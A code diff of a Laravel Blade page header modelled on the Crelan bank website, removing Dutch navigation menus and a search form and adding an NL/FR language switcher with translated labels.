-                      data-target="verzekeren" data-once="menu-focusout-handler">
-                      <p class="menu-extended-dropdown__title js-top-menu-interactive">Verzekeren</p>
-                      <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                        <li
-                          class="icon icon-office menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-office" aria-hidden="true"></span>
-                            <span class="menu-link__text">Woning</span>
-                          </a>
-                          <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                            data-target="verzekeren-woning">
-                            <p
-                              class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                              Woning</p>
-
-                            <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Woonverzekering
-                                </a>
                               </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Schuldsaldoverzekering
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                <a href="#"
-                                  class="menu-link menu-link--parent-link">
-                                  <span class="menu-link--parent-link__text">Ontdek meer over Woning</span>
-                                  <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                                </a>
-                              </li>
-
                             </ul>
-                          </div>
-                        </li>
-                        <li
-                          class="icon icon-car-side menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-car-side" aria-hidden="true"></span>
-                            <span class="menu-link__text">Mobiliteit</span>
-                          </a>
-                          <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                            data-target="verzekeren-mobiliteit">
-                            <p
-                              class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                              Mobiliteit</p>
-
-                            <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Autoverzekering
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Fietsverzekering
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Reisverzekering
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Students Travel verzekering
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                <a href="#"
-                                  class="menu-link menu-link--parent-link">
-                                  <span class="menu-link--parent-link__text">Ontdek meer over Mobiliteit</span>
-                                  <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                                </a>
-                              </li>
-
-                            </ul>
-                          </div>
-                        </li>
-                        <li
-                          class="icon icon-user-group menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-user-group" aria-hidden="true"></span>
-                            <span class="menu-link__text">Gezin</span>
-                          </a>
-                          <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                            data-target="verzekeren-gezin">
-                            <p
-                              class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                              Gezin</p>
-
-                            <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Familiale verzekering
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Ongevallen Privéleven verzekering
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                <a href="#"
-                                  class="menu-link menu-link--parent-link">
-                                  <span class="menu-link--parent-link__text">Ontdek meer over Gezin</span>
-                                  <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                                </a>
-                              </li>
-
-                            </ul>
-                          </div>
-                        </li>
-                        <li class="icon icon-hart menu-item menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-hart" aria-hidden="true"></span>
-                            <span class="menu-link__text">Leven</span>
-                          </a>
-                        </li>
-
-                        <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                          <a href="#"
-                            class="menu-link menu-link--parent-link">
-                            <span class="menu-link--parent-link__text">Ontdek meer over Verzekeren</span>
-                            <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                          </a>
-                        </li>
-                      </ul>
-
-                    </div>
-                  </li>
-                </ul>
               </nav>
-            </div>
+                          </div>
 
             <div class="nav-secondary-wrap">
               <div class="header-anchors">
-                <nav aria-label="CTA" id="block-cta-2" class="block block--menu block--menu--cta">
-                  <ul data-block="mobile_menu" class="menu menu--cta menu--parent">
-
-                    <li class="icon icon-user-single menu-item icon--replaced">
-                      <a href="#" class="menu-link menu-link--cta menu-link--icon"
-                        data-once="nav-event-mobile">
-                        <span class="menu-link__icon icon-user-single" aria-hidden="true"></span>
-                        <span class="menu-link__text">Aanmelden</span>
+                {{-- Language Switcher --}}
+                <nav aria-label="Language" class="block block--menu block--menu--lang" style="margin-right: 15px;">
+                  <ul class="menu menu--lang" style="display: flex; gap: 8px; list-style: none; margin: 0; padding: 0; align-items: center;">
+                    <li class="menu-item {{ app()->getLocale() === 'nl' ? 'is-active' : '' }}">
+                      <a href="{{ route('lang.switch', 'nl') }}" 
+                         style="font-weight: {{ app()->getLocale() === 'nl' ? '700' : '400' }}; color: {{ app()->getLocale() === 'nl' ? '#84bd00' : '#333' }}; text-decoration: none; padding: 4px 8px; font-size: 14px;">
+                        NL
+                                </a>
+                              </li>
+                    <li style="color: #ccc;">|</li>
+                    <li class="menu-item {{ app()->getLocale() === 'fr' ? 'is-active' : '' }}">
+                      <a href="{{ route('lang.switch', 'fr') }}" 
+                         style="font-weight: {{ app()->getLocale() === 'fr' ? '700' : '400' }}; color: {{ app()->getLocale() === 'fr' ? '#84bd00' : '#333' }}; text-decoration: none; padding: 4px 8px; font-size: 14px;">
+                        FR
                       </a>
+                  </li>
+                </ul>
+              </nav>
 
-                    </li>
+                
 
-                  </ul>
-
-                </nav>
-
-                <button id="search-menu-anchor" class="anchor-btn search-btn" aria-expanded="false"
-                  data-once="search-menu-anchor">
-                  <span class="visually-hidden">Zoeken</span>
-                  <span class="icon-magnifying-glass" aria-hidden="true"></span>
-                </button>
-                <div
-                  class="views-exposed-form bef-exposed-form search-block block block-configurable-views-filter-block block-configurable-views-filter-block-blocksearch-search-page"
-                  novalidate="novalidate" data-drupal-selector="form-Mdb9iPwkD0fjt5dUh_ngFRyqHdL_hBH35Nd12S73qrw"
-                  id="block-exposedformsearchsearch-page-2">
-                  <form data-block="mobile_menu" action="https://www.crelan.be/nl/particulieren/zoeken" method="get"
-                    id="form-Mdb9iPwkD0fjt5dUh_ngFRyqHdL_hBH35Nd12S73qrw" accept-charset="UTF-8">
-                    <div class="search-block__items">
-                      <div
-                        class="js-form-item form-item js-form-type-textfield form-type-textfield js-form-item-keywords form-item-keywords">
-                        <label for="edit-keywords--3">
-                          <span class="form-item__label__text">Ik ben op zoek naar</span>
-                        </label>
-                        <input placeholder="Geef je zoekopdracht in..." data-drupal-selector="edit-keywords" type="text"
-                          id="edit-keywords--3" name="keywords" value="" size="30" maxlength="128" class="form-text"
-                          data-once="nav-event-search-mobile">
-
-                      </div>
-                      <div class="hidden-exposed-filter"></div>
-                      <div data-drupal-selector="edit-actions" class="form-actions js-form-wrapper form-wrapper"
-                        id="edit-actions--3"><button class="button js-form-submit search-block__submit"
-                          data-drupal-selector="edit-submit-search-3" type="submit" id="edit-submit-search--3"
-                          value="Zoeken" data-once="nav-event-search-mobile">
-                          <span class="search-block__submit-label">Zoeken</span>
-                          <span class="icon-search"></span>
-                        </button>
-                      </div>
-
-                    </div>
-
-                  </form>
-
-                </div>
-
-                <button id="mobile-menu-anchor" class="anchor-btn mobile-menu-btn" aria-expanded="false"
-                  data-once="mobile-menu">
-                  <span class="visually-hidden">Menu</span>
-                  <span class="icon-menu" aria-hidden="true"></span>
-                </button>
               </div>
               <div class="region region--nav-secondary">
                 <nav aria-label="Functional menu" id="block-functionalmenu"
@@ -1006,7 +116,7 @@
                       <a href="#"
                         class="menu-link menu-link--functional menu-link--icon" data-once="agency-cta">
                         <span class="menu-link__icon icon-building" aria-hidden="true"></span>
-                        <span class="menu-link__text">Vind uw kantoor</span>
+                        <span class="menu-link__text">{{ __('messages.find_office') }}</span>
                       </a>
 
                     </li>
@@ -1020,1337 +130,6 @@
           </div>
         </div>
 
-        <div id="mobile-menu" style="display: none;" role="dialog" aria-modal="true" data-once="mobile-menu">
-          <nav id="mobile-menu-nav">
-            <div class="mobile-menu-inner">
-              <div
-                class="site-switcher-crelan_subsites-path-prefix block block-crelan-subsites block-site-switcher-block"
-                current_site="Particulieren" id="block-switchsite-mobile">
-
-                <div class="switch-sites">
-                  <button class="switch-sites__trigger js-switch-sites-trigger">
-                    Particulieren
-                    <span class="switch-sites__trigger__arrow icon-arrow-right-long" aria-hidden="true"></span>
-                  </button>
-                  <button class="switch-sites__back js-switch-sites-back" hidden="hidden">
-                    <span class="switch-sites__back__arrow icon-arrow-left-long" aria-hidden="true"></span>
-                    <span class="switch-sites__back__text">Alle categorieën</span>
-                  </button>
-                  <div class="switch-sites__items js-switch-sites-target" hidden="hidden">
-                    <ul data-block="mobile_menu" class="site-switcher">
-                      <li hreflang="nl" data-drupal-link-system-path="node/1346" class="site-switcher__item is-active"
-                        aria-current="page"><a href="#" class="site-link is-active"
-                          hreflang="nl" data-drupal-link-system-path="node/1346"
-                          data-once="nav-event-mobile">Particulieren</a></li>
-                      <li hreflang="nl" data-drupal-link-system-path="node/1986" class="site-switcher__item"><a
-                          href="#" class="site-link" hreflang="nl"
-                          data-drupal-link-system-path="node/1986" data-once="nav-event-mobile">Ondernemers</a></li>
-                      <li hreflang="nl" data-drupal-link-system-path="node/3172" class="site-switcher__item"><a
-                          href="#" class="site-link" hreflang="nl"
-                          data-drupal-link-system-path="node/3172" data-once="nav-event-mobile">Coöperanten</a></li>
-                    </ul>
-                  </div>
-                </div>
-              </div>
-              <div class="mobile-menu-inner__middle js-top-menu-main-mobile-navigation">
-                <nav aria-label="Products navigation" id="block-productsnavigation"
-                  class="block block--menu block--menu--products" data-once="mobile-menu-main">
-
-                  <ul data-block="mobile_menu_middle"
-                    class="menu menu--products js-top-menu menu--parent has-no-active-trail">
-
-                    <li
-                      class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
-                      <a href="#" target="_self"
-                        class="menu-link menu-link--products"
-                        data-drupal-link-system-path="taxonomy/term/65">Betalen</a>
-
-                      <button class="menu-button js-top-menu-trigger js-top-menu-interactive" data-trigger="betalen"
-                        aria-expanded="false">
-                        Betalen<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                      </button>
-                      <div class="menu-extended-dropdown menu-extended-dropdown--first js-top-menu-target"
-                        data-target="betalen" hidden="hidden">
-                        <button class="menu-previous js-top-menu-back-all js-top-menu-interactive" data-back="betalen">
-                          <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                          <span class="menu-previous__text">Alle categorieën</span>
-                        </button>
-                        <p class="menu-extended-dropdown__title js-top-menu-interactive">Betalen</p>
-                        <ul data-block="mobile_menu_middle"
-                          class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                          <li
-                            class="icon icon-circle-euro menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-circle-euro" aria-hidden="true"></span>
-                              <span class="menu-link__text">Zichtrekeningen</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="betalen-zichtrekeningen" aria-expanded="false">
-                              <span class="menu-button__icon icon-circle-euro" aria-hidden="true"></span>
-                              Zichtrekeningen<span class="menu-button__arrow icon-chevron-right"
-                                aria-hidden="true"></span>
-                            </button>
-
-                            <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                              data-target="betalen-zichtrekeningen" hidden="hidden">
-
-                              <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                                data-back="betalen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text">Alle categorieën</span>
-                              </button>
-                              <button class="menu-previous js-top-menu-back js-top-menu-interactive"
-                                data-back="betalen-zichtrekeningen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text"><span class="visually-hidden">Back to
-                                  </span>Betalen</span>
-                              </button>
-                              <p
-                                class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                                Zichtrekeningen</p>
-
-                              <ul data-block="mobile_menu_middle"
-                                class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Vergelijk onze packs
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Jongerenrekening
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Rekening voor uw kind
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Basisbankdienst
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                  <a href="#"
-                                    class="menu-link menu-link--parent-link">
-                                    <span class="menu-link--parent-link__text">Ontdek meer over Zichtrekeningen</span>
-                                    <span class="menu-link--parent-link__icon icon-arrow-right"
-                                      aria-hidden="true"></span>
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </li>
-                          <li
-                            class="icon icon-card menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-card" aria-hidden="true"></span>
-                              <span class="menu-link__text">Kredietkaarten</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="betalen-kredietkaarten" aria-expanded="false">
-                              <span class="menu-button__icon icon-card" aria-hidden="true"></span>
-                              Kredietkaarten<span class="menu-button__arrow icon-chevron-right"
-                                aria-hidden="true"></span>
-                            </button>
-
-                            <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                              data-target="betalen-kredietkaarten" hidden="hidden">
-
-                              <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                                data-back="betalen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text">Alle categorieën</span>
-                              </button>
-                              <button class="menu-previous js-top-menu-back js-top-menu-interactive"
-                                data-back="betalen-kredietkaarten">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text"><span class="visually-hidden">Back to
-                                  </span>Betalen</span>
-                              </button>
-                              <p
-                                class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                                Kredietkaarten</p>
-
-                              <ul data-block="mobile_menu_middle"
-                                class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Vergelijk onze kredietkaarten
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Visa Gold
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Visa Classic
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                  <a href="#"
-                                    class="menu-link menu-link--parent-link">
-                                    <span class="menu-link--parent-link__text">Ontdek meer over Kredietkaarten</span>
-                                    <span class="menu-link--parent-link__icon icon-arrow-right"
-                                      aria-hidden="true"></span>
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </li>
-                          <li
-                            class="icon icon-card menu-item menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-card" aria-hidden="true"></span>
-                              <span class="menu-link__text">Debetkaarten</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="betalen-debetkaarten" aria-expanded="false">
-                              <span class="menu-button__icon icon-card" aria-hidden="true"></span>
-                              Debetkaarten<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                            </button>
-
-                          </li>
-                          <li
-                            class="icon icon-computer menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-computer" aria-hidden="true"></span>
-                              <span class="menu-link__text">Online bankieren</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="betalen-online-bankieren" aria-expanded="false">
-                              <span class="menu-button__icon icon-computer" aria-hidden="true"></span>
-                              Online bankieren<span class="menu-button__arrow icon-chevron-right"
-                                aria-hidden="true"></span>
-                            </button>
-
-                            <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                              data-target="betalen-online-bankieren" hidden="hidden">
-
-                              <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                                data-back="betalen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text">Alle categorieën</span>
-                              </button>
-                              <button class="menu-previous js-top-menu-back js-top-menu-interactive"
-                                data-back="betalen-online-bankieren">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text"><span class="visually-hidden">Back to
-                                  </span>Betalen</span>
-                              </button>
-                              <p
-                                class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                                Online bankieren</p>
-
-                              <ul data-block="mobile_menu_middle"
-                                class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Homebanking myCrelan
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Crelan Mobile-app
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Veelgestelde vragen
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Digipass gebruiksaanwijzing
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                  <a href="#"
-                                    class="menu-link menu-link--parent-link">
-                                    <span class="menu-link--parent-link__text">Ontdek meer over Online bankieren</span>
-                                    <span class="menu-link--parent-link__icon icon-arrow-right"
-                                      aria-hidden="true"></span>
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </li>
-                          <li
-                            class="icon icon-circle-euro menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-circle-euro" aria-hidden="true"></span>
-                              <span class="menu-link__text">Onder nul gaan</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="betalen-onder-nul-gaan" aria-expanded="false">
-                              <span class="menu-button__icon icon-circle-euro" aria-hidden="true"></span>
-                              Onder nul gaan<span class="menu-button__arrow icon-chevron-right"
-                                aria-hidden="true"></span>
-                            </button>
-
-                            <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                              data-target="betalen-onder-nul-gaan" hidden="hidden">
-
-                              <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                                data-back="betalen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text">Alle categorieën</span>
-                              </button>
-                              <button class="menu-previous js-top-menu-back js-top-menu-interactive"
-                                data-back="betalen-onder-nul-gaan">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text"><span class="visually-hidden">Back to
-                                  </span>Betalen</span>
-                              </button>
-                              <p
-                                class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                                Onder nul gaan</p>
-
-                              <ul data-block="mobile_menu_middle"
-                                class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Vergelijk onze producten
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Kasfasciliteit
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Comfortkrediet
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                  <a href="#"
-                                    class="menu-link menu-link--parent-link">
-                                    <span class="menu-link--parent-link__text">Ontdek meer over Onder nul gaan</span>
-                                    <span class="menu-link--parent-link__icon icon-arrow-right"
-                                      aria-hidden="true"></span>
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </li>
-                          <li
-                            class="icon icon-shield-check menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-shield-check" aria-hidden="true"></span>
-                              <span class="menu-link__text">Veilig bankieren</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="betalen-veilig-bankieren" aria-expanded="false">
-                              <span class="menu-button__icon icon-shield-check" aria-hidden="true"></span>
-                              Veilig bankieren<span class="menu-button__arrow icon-chevron-right"
-                                aria-hidden="true"></span>
-                            </button>
-
-                            <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                              data-target="betalen-veilig-bankieren" hidden="hidden">
-
-                              <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                                data-back="betalen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text">Alle categorieën</span>
-                              </button>
-                              <button class="menu-previous js-top-menu-back js-top-menu-interactive"
-                                data-back="betalen-veilig-bankieren">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text"><span class="visually-hidden">Back to
-                                  </span>Betalen</span>
-                              </button>
-                              <p
-                                class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                                Veilig bankieren</p>
-
-                              <ul data-block="mobile_menu_middle"
-                                class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Tips veilig online bankieren
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Eerste hulp bij fraude
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Phishing en online fraude
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Online shoppen
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Veilig gebruik van uw kaarten
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                  <a href="#"
-                                    class="menu-link menu-link--parent-link">
-                                    <span class="menu-link--parent-link__text">Ontdek meer over Veilig bankieren</span>
-                                    <span class="menu-link--parent-link__icon icon-arrow-right"
-                                      aria-hidden="true"></span>
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </li>
-
-                          <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                            <a href="#"
-                              class="menu-link menu-link--parent-link">
-                              <span class="menu-link--parent-link__text">Ontdek meer over Betalen</span>
-                              <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                            </a>
-                          </li>
-                        </ul>
-
-                      </div>
-                    </li>
-                    <li
-                      class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
-                      <a href="#" target="_self"
-                        class="menu-link menu-link--products" data-drupal-link-system-path="taxonomy/term/67">Lenen</a>
-
-                      <button class="menu-button js-top-menu-trigger js-top-menu-interactive" data-trigger="lenen"
-                        aria-expanded="false">
-                        Lenen<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                      </button>
-                      <div class="menu-extended-dropdown menu-extended-dropdown--first js-top-menu-target"
-                        data-target="lenen" hidden="hidden">
-                        <button class="menu-previous js-top-menu-back-all js-top-menu-interactive" data-back="lenen">
-                          <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                          <span class="menu-previous__text">Alle categorieën</span>
-                        </button>
-                        <p class="menu-extended-dropdown__title js-top-menu-interactive">Lenen</p>
-                        <ul data-block="mobile_menu_middle"
-                          class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                          <li
-                            class="icon icon-office menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-office" aria-hidden="true"></span>
-                              <span class="menu-link__text">Woning</span>
